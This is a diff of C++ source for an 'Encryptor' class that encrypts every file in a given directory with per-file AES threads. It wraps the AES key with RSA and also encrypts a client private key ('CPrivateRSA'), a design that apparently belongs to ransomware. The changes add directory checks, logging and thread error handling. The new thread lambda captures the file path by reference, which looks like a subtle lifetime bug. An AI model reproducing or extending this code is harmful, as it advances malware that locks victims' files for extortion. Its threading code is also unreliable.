@@ -70,11 +70,26 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Ensure that no encryption files already exists!
     checkIfEncryptionFilesExists();
 
-    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
-    encryptCPrivateRSA();
+    // Check if dirPath exists
+    if ( !DirectoryIterator::exists(dirPath) )
+    {
+        throw EncryptorException("Provided Directory Path " + dirPath + " doesn´t exists!");
+    }
 
     // Get all files from provided directory path
     auto files =  DirectoryIterator::getAllFiles(dirPath);
+
+    if ( files.empty() )
+    {
+        throw EncryptorException("Provided Directory Path " + dirPath + " is empty!");
+    }
+
+    #ifdef LOGGING
+        LOG_TRACE("Found " << files.size() << " files in directory " << dirPath);
+    #endif
+
+    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
+    encryptCPrivateRSA();
 
     if ( !aes::AESEncryptor::initDone() )
     {
@@ -131,7 +146,7 @@ void Encryptor::encryptCPrivateRSA()
     try
     {
         // Get the CPrivateRSA.pem file string
-        std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
+        std::string cPrivateRSAStr = _rsaEncryptorAESKey->getPrivateKeyStr();
 
         // Encrypt the CPrivateRSA.pem file string
         int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(_rsaEncryptorCPrivateRSA->getEvpPkey(), cPrivateRSAStr);
@@ -193,10 +208,24 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
 
 void Encryptor::spawnThread(const std::string &filepath)
 {
-    // Create new instance for each huge file
-    std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
+
     // Create dedicated thread for this encryption file
-    std::thread t(&aes::AESEncryptor::encryptFile, *aesEncInstance, filepath);
+    std::thread t([&filepath]()
+    {
+        // Create new instance for each huge file
+        std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
+        try
+        {
+            // Encrypt the file with AES
+            aesEncInstance->encryptFile(filepath);
+
+        } catch (AESEncryptionException &e)
+        {
+            std::cerr << e.what() << std::endl;
+        }
+
+    });
+
     // Save thread in thread vector
     _threads.push_back(std::move(t));
 }
